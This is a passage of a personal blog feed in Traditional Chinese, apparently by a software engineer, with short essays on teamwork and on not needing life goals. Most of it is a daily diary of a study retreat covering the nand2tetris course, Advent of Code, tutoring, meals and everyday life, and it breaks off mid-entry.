title="結語"></a>結語</h3><p>其實我一直有點擔心這篇寫出來以後，大家會覺得我是個很難一起共事的人。但如果會這樣認為，可能一部分也是我文章沒有說明清楚。</p><p>我相信個人能力是團隊合作的基礎，我也贊同團隊合作的好處。在工作上我共事過的團隊其實也都相處滿融洽的，做起事情來也挺有效率。</p><p>不過從上面的段落或許也能看出來，我不喜歡參與公司活動。這跟公司或是同事關係不大，因為我本來就沒有很喜歡認識人或是交朋友。但我不會防止別人參與公司活動，同時也希望其他人不要防止我不參與公司活動。</p><p>我不是那種會一直抱怨團隊中誰誰誰效率好差，誰誰誰做得好爛的那種人。抱怨除了抒發心情以外沒有其他用處，比較有用的是自己動手去改進。當同事不熟某些技術的時候，可以推薦一些經典好文給他看，也可以在公司內辦讀書會或者是分享會之類的，這都是提升個人能力的一些方法。</p><p>總之呢，如何跟團隊裡的其他人相處的確是重要的課題，但與此同時也不要忽略了個人能力的重要性。若是個人能力不佳，那怎麼去做事？就算你跟團隊裡其他人溝通無礙也沒有用（除非你的工作只有溝通）。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>沒有目標也沒有關係</title>
      <link href="/2020/02/05/its-okay-if-you-dont-have-goal-35363a8d8266/"/>
      <url>/2020/02/05/its-okay-if-you-dont-have-goal-35363a8d8266/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/its-okay-if-you-dont-have-goal-35363a8d8266/0__oZSyXCE1__LVH4abn.jpg"></p><p>無論是以前在學校或者是出社會去面試的時候，總是會有這麼一題：</p><blockquote><p>你的人生規劃是什麼？</p></blockquote><p>如果不知道這題的答案，有另外一種方法很實用，就是想一下自己十年或是二十年後想要變成什麼樣子，然後再從那個樣子往回推，就可以大致上推出自己的人生規劃。</p><p>那我呢？我二十年後，當我四十六歲的時候想要變成什麼樣子？</p><p>我不知道，我是真心不知道。</p><p>而且我也不想知道。</p><p>我沒有想要變成的樣子，我不知道我四十歲的時候想要怎麼樣，我甚至不知道我能否活到四十六歲，這些對我來說太遠了。</p><blockquote><p>「這樣你的人生不就沒有目標沒有規劃嗎？不行啊，怎麼可以這樣！」</p></blockquote><p>為什麼不可以？</p><p>自己的人生自己做主，放棄也是一種選擇，沒有目標也是一種選擇。許多口口聲聲說著人生可以自己做選擇的人，是不是忘記把這些也列入選擇了？但它明明就是。</p><p>許多時候我們太過習慣於某個問題的存在，卻忽略了去質疑它的前提。</p><p>「你的人生規劃是什麼？」的前提在於「你的人生是有規劃的」，若是我的人生沒有規劃，我也沒有想要有規劃，自然就回答不出來這個問題。而且人生本來就不一定要有規劃。</p><p>沒有目標也是沒有關係的，不知道自己想幹嘛也是沒有關係的，但重點是要對自己誠實。</p><p>例如說，你不能明明很想要賺大錢卻做不到，而改口說：「沒有啊，賺那麼多錢幹嘛，我對金錢沒有目標」，這不是沒有目標，這只是說謊逃避而已。</p><p>反正自己在說謊的時候其實自己都會知道，不知道的話也不算說謊了。</p><p>我的確有想做的事，但那嚴格來說不算是生涯規劃。我的規劃僅存在於三年以內，三年後的事情太遠了我無法想像，我也不想去想像。對我來說，三年後的自己是什麼樣子，這是個「如果能預測到就不好玩了」的問題。</p><p>就是因為沒有長期規劃才有趣，就是因為無法預測才有趣。</p><p>寫這篇之前想到頂樓加蓋的這一集：<a href="https://podcast.overbuild.io/podcasts/2">Ep 2: 對人生沒有方向的人，我們建議你隨波逐流。</a>雖然說講的東西不太一樣，但都是跟人生方向有關，也推薦大家去聽一下。</p><p>我只是很想跟大家說，在這個好像人人都一定要有目標的年代，沒有目標真的沒有關係。不需要因為社會的壓力以及別人的要求讓自己有目標，如果你真的沒有人生規劃，那就沒有，那也沒差，沒事的。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我與拖延症對抗的五十天</title>
      <link href="/2020/02/03/fight-against-procrastination-but-lost-b43d3c4164e1/"/>
      <url>/2020/02/03/fight-against-procrastination-but-lost-b43d3c4164e1/</url>
      
        <content type="html"><![CDATA[<p>原本想要趁著閉關修煉的這段時期每天寫一篇日記，在一年後就可以來開個訂閱制的專案，每天都會重播我一年前的那天的日記。想說這樣應該超級有趣，若是不知道是一年前的日記，就跟每天追 live 差不多。</p><p>但我失敗了，才寫了五十天就懶得寫了。失敗不是壞事，失敗了卻又不敢承認自己失敗才是。由於只寫了五十天，所以原本想做的事情也不能做了，就公開放在這邊當作紀錄吧。</p><p>話說文有點長，請自己斟酌要不要觀看，底下大概有個兩萬字。</p><p>然後這篇是日記，另外一篇講出關的請參考：<a href="/2020/02/02/i-failed-9386c6b0a681/">提早出關，大家安安</a>。</p><h3 id="Day1：2019–11–26"><a href="#Day1：2019–11–26" class="headerlink" title="Day1：2019–11–26"></a>Day1：2019–11–26</h3><p>2019 年 11 月 26 日 天氣陰</p><p>為了閉關修煉而做前置準備的第一篇日記，如果沒意外的話，之後每天應該都會有一篇。</p><p>如果一切都順利的話，一年以後會有一個計畫是把這些日記 replay 給有訂閱的人。換句話說，就是每天都會收到我的一份日記，雖然我也不知道有誰會想看，但總覺得還滿有趣的。而日記裡面發生的那些事，對我來說都已經是過去式了。</p><p>所以這篇是未來要拿來先公開的部分日記，讓大家看一下這份日記到底都會寫一些什麼東西。</p><p>今天中午不爭氣地叫了外送，點了漢堡王的華堡，想著晚上一定要出去吃。結果晚上點了肯德基，真的是罪惡罪惡。讓我不禁想說，這樣子，之後真的能順利閉關嗎？</p><p>然後總算把之前一直很想寫的主題之一寫完了： <a href="https://blog.huli.tw/2019/11/26/dont-break-web-smooshgate-and-keygen/">Don’t break the Web：以 SmooshGate 以及 keygen 為例</a> ，查了很多資料也看了很多程式碼，覺得頗有收獲。</p><p>然後還試著把之前買的白板壁貼貼上去了，但貼了之後突然覺得還是直接買一塊白版比較好，之後我要來念演算法的時候寫東西也比較方便，否則的話我還要站起來寫牆壁上面。另一方面是擔心壁貼後面的膠黏在牆壁上就麻煩了。</p><p>這是閉關前的最後一週，但因為要跟一些家教學生聯絡的關係意外地忙。</p><p>閉關真的能夠順利進行嗎？我不知道。我希望能順利。但如果什麼都不做的話，光講講是沒有用的。這兩天要來把之後閉關的菜單準備好，每天自己煮自己吃，從飲食先開始。</p><h3 id="Day2：2019–11–27"><a href="#Day2：2019–11–27" class="headerlink" title="Day2：2019–11–27"></a>Day2：2019–11–27</h3><p>今天開始了家教計畫，但其實有些學生只是來問一些問題，而不是長期教的那種。其實這種我也覺得不錯，而且能幫到的地方搞不好比想像中的還要多。</p><p>一共教了四個小時，時薪 2500，收了一萬塊。</p><p>對方的問題大概是想要往下一個階段走，被主管說缺乏「Impact」，我給了他一些建議。例如說，我跟他講說這個 Impact 你可以想成是很多公司會強調的 initiative，主動性。在我看來白話文的解釋就是「發現問題，並想辦法解決它」，前者很多人都有做到，但後者就不一定了。</p><p>例如說公司的 onboarding process 不好，每次都用口耳相傳才能讓新人知道要幹嘛，這時候我就會想來寫個 documentation，把常見的問題跟公司的系統架構都寫進去，就不用每次都用嘴巴跟新人講，只要把文件丟給他就好。</p><p>公司類似的問題可能有很多，但重點是除了發現問題以外，還要想辦法去解決它。如果每個人都這樣想而且這樣做，做事就會變得愈來愈有效率。</p><p>晚上則是去小樹屋（一個租來的空間）跟學生們聊聊天，看了學生拿到的 offer，也稍微討論了一下要怎麼鼓勵同學們勇於投履歷。</p><h3 id="Day3：2019–11–28"><a href="#Day3：2019–11–28" class="headerlink" title="Day3：2019–11–28"></a>Day3：2019–11–28</h3><p>早上繼續昨天未完成的家教，分享了以前公司做過的搶紅包機制原理。雖然說大型電商的搶購活動又更複雜，但還是有一些概念是相通的。除此之外也帶對方寫了幾題 NPSC 的題目，這是我一直很想開課的一個主題。</p><p>課程名稱想要叫做「連這些水題都不會，你跟別人刷什麼 leetcode」，裡面帶大家寫一寫 NPSC 國中組的題目，讓大家知道自己連國中生的程度都比不上，還是好好從基礎開始打起比較實在。</p><p>下午去了第二個家教，用 selenium 操控一個網頁做一些神祕的事，網頁的 code 品質真的是滿奇妙的，有一堆神秘的 code name，然後還有一些一看就是 legacy code 的東西，真的不同次元的世界。</p><p>晚餐吃了頂呱呱，發現原來我是第一次吃頂呱呱…呱呱包比想像中好吃，甜甜包也是，炸雞就普普通通，地瓜薯條比一般薯條飽太多了。綜合起來其實滿不錯的，是我會願意再吃一次的組合。</p><h3 id="Day4：2019–11–29"><a href="#Day4：2019–11–29" class="headerlink" title="Day4：2019–11–29"></a>Day4：2019–11–29</h3><p>今天看了一直很想看的課程：From nand to tetris 的第一個單元，主要都在講邏輯閘相關的東西，想起了以前大一時在系上修的課：基本邏輯，一樣要用幾個邏輯規則去證明或是簡化式子。</p><p>以前就知道 NAND 就可以做出所有邏輯，但沒想過怎麼證明，被課程提點之後發現滿簡單的。只要做出 NOT 跟 AND，就可以用 De Morgan’s laws 做出 OR，而 NOT 就是 x NAND x，AND 就是 NOT( x NAND y)，就可以證明了，比想像中容易很多。</p><p>這堂課還有一個很值得學習的地方，就是利用自己做的工具來簡化課程，例如說有關硬體的部分自己開發出一個簡單的模擬器還有語法，讓學生練習寫 HDL，而不是使用現成那些比較難的，這部分真的很值得效法。</p><h3 id="Day5：2019–11–30"><a href="#Day5：2019–11–30" class="headerlink" title="Day5：2019–11–30"></a>Day5：2019–11–30</h3><p>今天去看了雷亞的 deemo 特展，雖然沒什麼玩過就是了。</p><p>其中有一個互動展區是用 PSVR 來玩，還滿酷的，但 VR 的問題好像跟我兩三年前隨意試玩的時候一樣，那就是畫面不夠精緻？其他靜態展區就是展一些沒公開過的手稿之類的，如果是 deemo 迷應該滿開心的，可以看到很多相關的東西。</p><p>但我對這故事沒什麼理解，所以就還好，我在思考的是另外一件事，那就是遊戲可以做到這樣真的滿厲害的。俗稱的 IP IP 應該就是如此吧，從一款遊戲發展出獨特的故事、角色以及世界觀，可以做周邊、動畫甚至是劇場版電影，真的很厲害。</p><p>離對外公開要閉關的日子只剩一兩天了，到此刻還是很不安。雖然可以跟自己說：「放心，因為還沒開始閉關嘛，閉關後就沒事了」，但真的有那麼神奇嗎？一夕之間就把壞習慣通通改掉。應該是沒有那麼神奇才對。</p><p>不過寫下來以後舒坦多了，至少我有誠實面對自己。</p><h3 id="Day6：2019–12–01"><a href="#Day6：2019–12–01" class="headerlink" title="Day6：2019–12–01"></a>Day6：2019–12–01</h3><p>今天把閉關修煉的文章 po 出去了。</p><p>也把手機上臉書與 messenger 的 app 都刪掉了。</p><p>但在做這些事情時，覺得有點不真實。 總覺得好像心理上還沒準備好，就只是因為時間點到了，所以才做這件事。</p><p>不過既然都對外公開了，那就這樣吧。</p><h3 id="Day7：2019–12–02"><a href="#Day7：2019–12–02" class="headerlink" title="Day7：2019–12–02"></a>Day7：2019–12–02</h3><p>正式閉關修煉的第一天。</p><p>台北變得好冷，但好像還會更冷，哭哭。</p><p>昨天因為一些事情導致兩三點才睡，早上不意外地十點十一點多才起床。刪掉臉書 app 的好處就是好像不太會在床上滑手機了，因為根本沒東西可以滑。</p><p>今天開始要來正式改善飲食外加計算熱量，原本中午想跑去吃鐵板燒的，豆芽菜+高麗菜+雞腿肉，怎麼想都覺得是個滿不錯的外食選擇，但可惜禮拜一沒有開。</p><p>一時也不知道吃什麼，就吃了牛肉麵外加小菜豆干與滷蛋，粗略估算前者應該有個 900 大卡左右，後兩者加起來應該 200 大卡，反正沒吃早餐，吃多一點好像也沒什麼關係，加起來不要爆掉就好。</p><p>中午出去剪了頭髮，看著 Google Map 上幾乎一片的好評每次都覺得怪怪的，都懷疑是不是整合行銷公司在那邊洗分，但剪了之後覺得還不錯。我以前都會特地找哪邊剪頭髮比較厲害然後跑去那邊，看來以後可以到自己家裡附近隨便剪剪就好。</p><p>下午去全聯採購，買了晚餐滷味拼盤加即食雞胸肉，還買了第一次看到的義美鮮奶豆奶，我覺得這超棒欸！又可以補充蛋白質又可以補充鈣，而且無糖豆漿我喝不慣，但是加了鮮奶我就可以！</p><p>然後買了要自己煮的雞胸肉、蛋跟水煮鮪魚罐頭，明天來試試看那什麼鮪魚蛋捲的，感覺就會失敗…不過蛋跟鮪魚都是好吃的東西，應該也沒辦法弄得多難吃才是。</p><p>其他時間開始看名題百則，也開始認真修 nand2teris，week1 的作業成功交出並且拿到滿分，這堂課真的很不錯，期待後續內容。</p><p>話說這幾天天氣好冷，完全不想出去運動…明天下午有空的話到樓下健身房看看好了。</p><h3 id="Day8：2019–12–03"><a href="#Day8：2019–12–03" class="headerlink" title="Day8：2019–12–03"></a>Day8：2019–12–03</h3><p>今天繼續修 nand2tetris，week2 難度比之前高一點，但整體來說還算輕鬆 week3 看到一半，感覺不簡單，而且難度又高了許多 不過這真的是一門好課，有很多概念可以用在自己之後的教學上，獲益良多</p><p>中午出去覓食，再次沒吃到鐵板燒，明天再去看一下好了，沒開的話應該就會休息一陣子了</p><p>下午的時候耍廢看了 YouTube 兩個小時，每次這樣做的時候都會試著說服自己：反正閉關剛開始嘛，要循序漸進</p><p>雖然聽起來有點道理，但這個標準實在是很難拿捏，搞不好到第三個月的時候一樣會這樣跟自己說？，那就變成只是在逃避而已了</p><p>總覺得這些日記好像比較像流水帳一點，但我預期應該要有更多心裡話或是自我反省之類的，可能是因為寫這些的時候都還早吧？晚上的話比較有靈感，但那時候我已經睡了QQ</p><h3 id="Day9：2019–12–04"><a href="#Day9：2019–12–04" class="headerlink" title="Day9：2019–12–04"></a>Day9：2019–12–04</h3><p>早上開始繼續讀 from nand2tetris，讀到什麼 combinational circuit 跟 sequential circuit 就有點卡住了，作業暫時還沒寫</p><p>下午去小樹屋幫同學解答了一題 medium 的 leetcode，不過是看提示才解出來的</p><p>今晚跟阿千還有 ant 大大以及他的同事們吃飯</p><p>前情提要一下，我在很久以前就有追蹤 ant 大大以及他公司的另外兩個共同創辦人，一個是律師，但之前把臉書關了，文章都改放在自己家事務所上面： <a href="https://www.ecounsel.net/zh/2014/12/29/%e5%be%9euber%e5%9c%a8%e5%90%84%e5%9c%8b%e7%9a%84%e7%88%ad%e8%ad%b0%ef%bc%8c%e8%ab%87%e5%95%86%e5%93%81%e4%b8%8a%e5%b8%82%e4%b9%8bcompliance/">從Uber在各國的爭議，談商品上市之Compliance</a></p><p>另外一個是網路行銷界很有名的大大：小黑 邱煜庭，總之就是我早就追蹤這群大大已久</p><p>那為什麼會被約吃飯呢？ 都要感謝阿千，我在推特上轉了她那篇鐵人賽斷賽的心得，然後就被 ant 回覆說很欣賞這篇文章，想找我們兩個吃飯，於是今天就是我們+ant+他的兩個同事吃飯</p><p>才剛吃沒多久就被認出來有去書亞集成面試過，因為其中一個當初面試的同事就是吃飯的那個，不過我是完全沒認出來就是了…隔太久了，已經三四年前的事了</p><p>對於課程方面，ant 建議說可以去找企業合作，例如說企業開需求出來，想要找怎樣類型的人，我就根據這個調整課綱。課程結業之後就可以直接把人送進去企業裡面做個三個月試試看之類的，聽起來好像不錯，可以列入以後的考慮選項</p><p>ant 大大分享了許多職涯上的建議，例如說：當你 40 歲的時候，要怎麼跟 20 前的自己競爭？ 或者是如果有人給你一百萬美金要你做個案子，你要怎麼在短時間內說服他你做得到之類的，後者其實已經偏向管理職的思維了，就是要把眼光放在商業而非技術</p><p>又或是你今天在一個相對高的職位，然後公司把一個案子交給你，公司想知道的是整套的 solution，要你把這個案子完成，而不是把自己侷限在「工程」的領域，在那邊討論要用 vue 還是 react，那些都只是幫助你達成目標的工具而已，重點是要如何解決這個問題，技術那些都是其次了</p><p>聽一聽的確是啦，比較少工程師會有這個思維，都只著重在技術上</p><p>但我其實覺得也沒什麼不行，就看你想往哪個方向走而已，如果你想繼續鑽研技術，那就一直當工程師就好，反正再怎麼樣還是需要工程師，但若是想要往上面爬，想當管理職，那就必須學會與人溝通以及一些商業的思維，把重點放在完成這件事情，而非全然是解決工程上的問題</p><p>其實在聽的過程中我一直想到 <a href="https://www.pressplay.cc/project/about/%E5%95%86%E6%A5%AD%E6%80%9D%E7%B6%AD%E5%AD%B8%E9%99%A2%EF%BC%9A%E7%9C%9F%E5%AF%A6%E5%B8%82%E5%A0%B4%E7%9A%84~/4F939C3F6E137B8D67865F56ACDB1D64">商業思維學院</a>，創辦人 gipi 也是 TGO 鯤鵬會的成員之一，之前其實就有在想要不要報名，今天聽完 ant 的話又更想報了 但想報的原因也不是我想成為 CTO 或什麼的，只是覺得多學一點也不錯</p><p>我一直認為你想走什麼路就走什麼，你不想往高的地方爬也可以，留在原地也完全沒有問題，我也沒有很想往上走，但有時候會想說如果能到上面去看看，好像也滿不錯的，就是一種新鮮感以及新的挑戰的感覺吧</p><p>最後幫今天做個結論，今天聽到了在一個 CTO，在一個管理者的位置所思考的問題以及一些想法，這當然是有些收穫的，可以幫助自己去想說職涯要怎麼走</p><p>但我同時也要強調另外一點，就是除了吸收這些以外，也要想想：「自己到底想不想要？」，你想要到那個位置嗎？你想要處理那一大堆跟人相關的事情嗎？ 如果答案是 No，那或許有些問題你就不會去面對到</p><p>Yes 跟 No 沒有高下優劣，就只是種選擇而已</p><p>更晚的時候都在玩 <a href="https://adventofcode.com/2019">advent of code</a> ，隨意亂喇一波</p><h3 id="Day10：2019–12–05"><a href="#Day10：2019–12–05" class="headerlink" title="Day10：2019–12–05"></a>Day10：2019–12–05</h3><p>早上沒做什麼事，台北依然是個雨天，而且又變更冷了。</p><p>中午邊吃午餐邊等著一點鐘開題的 advent of code，看了一下題目發現比想像中麻煩，果斷放棄。吃完午餐之後才開始認真解，不過還是陸陸續續卡了一個小時，其實有點久，再來把 nand2tetris 搞不懂的地方繼續看了幾遍，明天再開始做作業吧</p><p>晚上跟網友吃飯，外文系畢業的後端工程師，這背景也是十分特別，聊了很多跟程式還有旅遊相關的事情</p><p>話說我應該每天逼自己至少要寫半個小時的日記才對，不然這個量實在是太少了，應該可以寫出更多東西來才對，只隨便打個流水帳記個幾句總有種在敷衍的感覺？ 或者是說在拖延吧，拖延寫日記然後把時間拿去做其他耍廢的事情之類的，這樣不行啊啊啊啊啊</p><p>好，從明天開始慢慢改善，今天繼續耍廢</p><h3 id="Day11：2019–12–06"><a href="#Day11：2019–12–06" class="headerlink" title="Day11：2019–12–06"></a>Day11：2019–12–06</h3><p>中午再次挑戰了 advent of code，這次簡單的 DFS&#x2F;BFS，分別花了二十分鐘跟十分鐘寫出來，真的是都忘光光了…</p><p>下午突然對「名氣」這件事情有一些感想。</p><p>會有感想的原因來自於發現自己在某個領域（例如說網頁前端工程師或放大一點到網頁相關工程師）中，比想像中的還有名。例如說學生去面試的時候提到我，面試官會表示聽過 huli 這個人也看過他的文章之類的。除此之外也當面接觸到一些部落格的讀者，是真的滿喜歡我的文章</p><p>我喜歡這種名氣嗎？</p><p>喜歡，因為你知道有人肯定你，有人喜歡你的作品。或除了這些以外，有名氣本身就滿棒的，好像有種：「哇，好厲害」的感覺。不過喜歡歸喜歡，其實伴隨著的是不安。</p><p>第一個不安來自於…資訊不對稱？技術文展現出來的是我最擅長的那一面，但若是有天碰到本人，結果發現有些很基本的東西我不擅長甚至完全不會呢？是不是他們自己建構出來的我的形象就崩塌了？總之就是有種冒牌者症候群的感覺，怕哪天被拆穿，還是我應該也要來學 dan 哥發文寫自己不會的東西</p><p>第二個不安來自於怕自己哪天被名氣蒙蔽了，還真的以為自己超強。我覺得我文章寫得不錯技術也行，這我可以肯定自己沒問題，但重點是我同時也認識一堆更厲害的人，只是他們沒有對外分享，所以或許我是寫某些主題裡面看起來最厲害的，但這是因為那些更厲害的沒有寫，不是因為我是最厲害的。</p><p>雖然有點跳但先做個簡單總結好了，我認為自己的名氣有點成長太快，實力還跟不上，所以才有了以上的擔憂。期許自己哪天實力跟上了以後，可以跟自己也跟所有人說：</p><p>對，我就是強</p><p>喔對了還有，我認為名氣是無法自己控制的，多或少都不行，除非以後不再寫文，否則是做不到的。但對於跌下來這件事，我想一下之後覺得還好，就算真的被捧高我覺得也不是我的問題，只要沒有自我膨脹亂講話就好，他們想像出來的大神形象只是他們自己的想像，我從來都不認為自己是那樣</p><h3 id="Day12：2019–12–07"><a href="#Day12：2019–12–07" class="headerlink" title="Day12：2019–12–07"></a>Day12：2019–12–07</h3><p>閉關差不多一週了，今天也是十分怠惰的一天…</p><p>advent of code 題目有點懶得想，就暫時 pass 了，然後 nand2tetris 的作業還沒有進展…希望之後會順利一點</p><h3 id="Day13：2019–12–08"><a href="#Day13：2019–12–08" class="headerlink" title="Day13：2019–12–08"></a>Day13：2019–12–08</h3><p>早上一樣耍廢了一波，下午去上英文課</p><p>每次都會有種很想翹課的衝動，跟學生時期沒兩樣。最大的差別就在於學生時期會真的翹課，但長大了反而不會。大概是因為以前真的很不喜歡上課，所以翹課合情合理，但長大以後翹課只是「逃避上課」而已，其實沒那麼討厭上課，而且課程也是自己報的。翹了的話純屬偷懶，大概是知道這樣好像不太好，所以也只是想想而已，還沒有翹過課。</p><p>晚上幫媽媽看一下之後要去日本的行程，看起來都滿 ok 的，去了東京三四次的我也對那邊比較熟一點了，大概可以指出哪個知名景點在哪個站之類的。</p><p>我在想是不是從明天開始應該要換個主題來閱讀，否則現在的東西卡著也是卡著，好像不會突然解開。順便應該也來規劃一下時間了，每天的幾點到幾點就是強迫寫心得之類的，這樣才不會跟幾天前的心得一樣隨便寫個幾行就結束了。</p><h3 id="Day14：2019–12–09"><a href="#Day14：2019–12–09" class="headerlink" title="Day14：2019–12–09"></a>Day14：2019–12–09</h3><p>又是一個幾乎一事無成的一天。</p><p>下午去看了牙醫，做牙齒檢查。因為生性懶惰的關係，拖了很久都沒有去，今天去了跟我說我有三年沒有在這間檢查了。大概一年前回台灣的時候有去另外一間洗牙（因為這間太夯了約不到）。</p><p>重新照了 X 光片，狀況看起來不錯，洗牙的時候那些機器滋滋滋的聲音跟工廠好像，但我原本就不排斥這些聲音，所以一點都不會覺得可怕。檢查結果是有一顆牙蛀掉一點，上排的智齒則是蛀了一個大洞，建議我拔掉。</p><p>但我不想拔牙，感覺就好痛，而且我已經超多年沒有拔牙了。</p><p>洗完以後的牙齒比想像中的白淨，會這樣說是因為上次去另一間洗牙，洗完以後發現牙齒上面那些黑黑的東西還在，我想說：「完了，那些該不會是洗不掉的東西吧」，結果這次洗完發現乾乾淨淨，清潔溜溜。上次那間是在哈囉？</p><p>晚上繼續來寫 advent of code，愈寫愈覺得是個好活動。這次的題目一樣是之前的延伸，原本就已經殘破不堪的 code 經不起這種改動，於是我放棄了，直接整個重寫，終於寫出一個好維護很多的版本，大約花了一兩個小時左右。</p><p>但看到 AC 的時候滿爽的就是了，解題就是這樣。</p><h3 id="Day15：2019–12–10"><a href="#Day15：2019–12–10" class="headerlink" title="Day15：2019–12–10"></a>Day15：2019–12–10</h3><p>昨晚 11:30 就睡了，早上睡到快十點才醒，十分充足的睡眠時間。</p><p>稍微整理一下東西之後就搭車前往小樹屋，不知道以前有沒有在日記裡面提過這個詞，以防萬一再介紹一遍好了。小樹屋是一系列的空間，分散於台北市各處，以小時計費，從容納 2 人的到容納 50 人的空間都有，只要上網自己預約時段，再用密碼進入空間即可。</p><p>然後有月費方案，一個月 5990 元就可以任意租借 24hr 內的空間，幾個學生們還有我合租了一個空間，每天都有地方可以去。無論去認真做事或是去耍廢也好，有個實體空間真的滿重要的，突然有點想念台南的好想工作室。</p><p>去那邊以後只有另一個同學，就可以各做各的事情，稍微繼續了一下 nand2tetris，到了下午一點就開始寫 advent of code 的題目，今天的題目比較麻煩一點，想了一段時間才寫出來，尤其是第二題，看到的時候就不想寫了…後來才克服心理障礙，把我認為可以解出來但是麻煩的方法實作出來，後來看了看時間，其實也是在兩小時以內 AC。</p><p>中途跟阿千聊了一下，去日本的事情看起來差不多告一個段落了，應該是能順利前往，真是可喜可賀，可喜可賀。聊完以後繼續看我的 nand2tetris，終於把第三週的作業給寫完了！第三週的作業很有趣，要做 register 以及 RAM，從小的開始做然後慢慢擴展到大的，這種出作業的方式真的很值得學習。</p><p>晚上離開小樹屋以後去忠孝新生附近的咖啡廳家教，總覺得有聽過那間店，到了以後發現人比想像中的少，大加分，東西也滿好吃的。家教學生上過前端相關的課程，但是對於 JS 的基礎不太熟練，在教的時候從最基本的題目開始帶，以後應該要累積一些 codewar 的題目或是自己出題目才對，專門去訓練這些基礎，不然初學者沒人帶又不知道去哪邊練的話，最後出來滿慘的。</p><p>發現以後日記應該要至少寫這麼多才對，不然每天 po 一篇應該沒人想看吧 😂 。</p><h3 id="Day16：2019–12–11"><a href="#Day16：2019–12–11" class="headerlink" title="Day16：2019–12–11"></a>Day16：2019–12–11</h3><p>早上看了 nand2tetris 的一點點，第四週開始要來寫組合語言，不知道為什麼我特別愛組合語言。大學時期我修過一門資工系的課，叫做計算機組織與組合語言，還有一門資管系的課，叫做計算機組織與結構。會修這兩門課的原因是一樣的 — 因為作業可以寫組合語言。</p><p>我想，可能是因為我覺得能看懂還有能寫出組合語言很帥吧，不知道是被什麼東西給影響。</p><p>我記得當初資工系那門課的 final project 主題可以自己定，我的主題是「程式的拆解與再造－－逆向工程」，示範用 Ollydbg 破解自己寫的小程式以及網路上隨便亂找的需要註冊的程式。真的很有趣。</p><p>下午一點準時開始解 advent of code，但這次卡關卡到爆，一直到晚上五點離開小樹屋的時候都還沒找出 bug 到底在哪裏。無奈之下只好找了別人寫的解答，開始瘋狂印 log，一行一行指令去比對到底哪邊出了問題，最後發現是一個很蠢的地方…</p><p>當初在重構時我以為所有指令都是把結果寫到第三個參數，但是唯獨 READ 這個指令是要寫到第一個參數所在的位置，就是這邊我沒有考慮到也沒有改到，所以就錯了…不過往好處想，也幸好有發現這個 bug，不然只會一錯再錯。</p><p>喔對了，我一直到晚上十一點半左右才終於找到這個 bug，我好弱。</p><p>晚上離開小樹屋之後隨意吃了點東西，然後就前往健身房，跟著 alex 一起運動，今天原本想讓我練上半身，後來發現下半身比較需要加強，就先從腿部開始。突然想起來四五年前去健身房量 inbody 的時候，教練好像就說我腿比較需要練，但我日常生活還真的沒注意到腿比較弱這件事，走起路來感覺都沒什麼問題。</p><p>總之今天這樣練，腿超級痠，看來是真的很弱。</p><h3 id="Day17：2019–12–12"><a href="#Day17：2019–12–12" class="headerlink" title="Day17：2019–12–12"></a>Day17：2019–12–12</h3><p>今天中午把昨天家人剩下的鍋貼自己再煎一煎，順便燙個青菜來吃，覺得很充實。邊吃飯邊配著電視上的節目，小明星大跟班有一集在討論各種社交恐懼症的，感覺都是在叫那些來賓勇於跨出第一步出去社交，不知道從什麼時候開始，主流的聲音才會變成：「不想社交就不要社交，開心就好，活在自己的小世界裡也好」。</p><p>下午一點準時開題 AoC（Advent of Code），這次的題目比昨天簡單很多，但還是因為眼殘所以沒看清楚題目多花了一些時間，part2 也因為寫了一個沒效率的解法花較久時間，後來才突然想到效率高很多的解法。</p><p>雖然說花比較久時間，但還是拿到個人最佳成績，part2 排 183 名，開心。</p><p>接著出門到小樹屋認真做事外加隨意跟同學聊天，看了 nand2tetris 第四週的影片，總之就是在介紹 HACK computer 的 machine code 以及 assembly code，這週的作業要寫出一個乘法的程式以及另一個偵測鍵盤互動的程式。因為以前就對組合語言比較有經驗，所以寫起來都還算順利，大概兩小時以內就順利寫完然後過關了。</p><p>不過大魔王估計是在之後的第六週，要寫出 assembler，把 asm 轉成 machine code。</p><p>話說這一週的內容挺有趣的，對於 input&#x2F;output 的講解深入淺出，可以把打字想成你打的字的 key code 會存在記憶體裡面的某個地址，而輸出就是有一塊記憶體螢幕會一直去讀取，你改成 1 那個 pixel 就是黑色，0 就是白色，這樣就可以解釋怎麼利用更改記憶體位置去輸出畫面了。</p><p>晚上吃了很久沒有吃的八年得，經典組合兩塊臭豆腐加王子麵外加白飯依然很飽也很滿足，推薦了這間店給其他同學們，還順便講了我與八年得的故事。</p><p>搭公車回家的時候人很多，突然想到如果以後要在外租房，先調查好附近的公車站狀況如何應該也是件重要的事，因為我家住的是比較靠近底站的地方，所以人幾乎都下光了，就不用在那邊一直借過借過很麻煩，上車的時候也很有機會有位子坐，靠近底站就是有這種好處。</p><p>最麻煩的就是要在人多但很少人下車的冷門站下車，因為沒有人會幫你開路，你只能自力更生。</p><h3 id="Day18：2019–12–13"><a href="#Day18：2019–12–13" class="headerlink" title="Day18：2019–12–13"></a>Day18：2019–12–13</h3><p>作者外出取材，休刊乙日。</p><h3 id="Day19：2019–12–14"><a href="#Day19：2019–12–14" class="headerlink" title="Day19：2019–12–14"></a>Day19：2019–12–14</h3><p>早上直接出門去小樹屋，在那邊修改明天要 po 的課程心得。</p><p>晚上與兩個學生一起去吃了咖哩，心得如下：</p><p>『評論說這是一間需要勇氣才能去的店』</p><p>Y 說得沒錯。</p><p>我們三人站在通往二樓的樓梯口，看著一旁的壽司店，正猶豫著要不要進去。不是我們退卻，是這間店的位置真的太奇妙，那不是一間餐廳該有的位置。</p><p>「走吧」</p><p>上了二樓，發現跟普通的住家沒兩樣，可能是怕來朝聖的人以為自己走錯，牆壁上還有貼著指標。轉了一個彎，眼前的畫面立即告訴我我們來對了地方。在眾多住家之中，有其中一間的牆壁上裝飾著各種印度風的東西，就是它了。</p><p>走到了門口，連門都是一般住家的那種門，看來是個一般住家改建而成的餐廳。雖然我口中說著「進去吧」，但其實我默默站在旁邊，讓 C 去開門。</p><p>進去以後最引人注意的是入口旁的電視，連接著電腦正播放著 YouTube 影片，是印度明星的 MV。店裡的座位不多，大概只能容納 20 